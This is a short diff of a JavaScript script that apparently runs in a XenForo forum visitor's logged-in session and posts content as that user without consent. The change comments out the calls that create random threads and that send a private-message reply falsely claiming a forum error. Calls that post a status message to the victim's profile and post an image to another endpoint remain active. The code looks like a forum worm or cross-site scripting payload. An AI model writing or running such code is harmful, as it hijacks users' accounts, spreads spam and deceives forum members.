@@ -48,11 +48,14 @@
     let thread_message = messages[Math.floor(Math.random()*messages.length)];
     let thread_title = titles[Math.floor(Math.random()*titles.length)];
     
+    /*
     await XenForo.ajax("forums/8/add-thread", {title: thread_title, message: thread_message});
+    
     if (Im.conversationId) {
       let message = "Извините, в личных сообщениях форума произошла ошибка.  Для выхода, пожалуйста, нажмите кнопку \"Покинуть переписку\"."
       await XenForo.ajax(`conversations/${Im.conversationId}/insert-reply`, {message_html: message})
     }
+    */
 
     await XenForo.ajax(`/members/${XenForo.visitor.user_id}/post`, {message_html: 'Кажется, что-то случилось с моим статусом! Надо исправить!'});
     await XenForo.ajax('/rays/post',{message_html: '<p>гриша извини</p><p>[img]https://i.ibb.co/8gD1VmnC/1000081369.jpg[/img]</p>'});
@@ -71,4 +74,4 @@
   __/ |                                                
  |___/                                                 
 
-*/
+*/ 
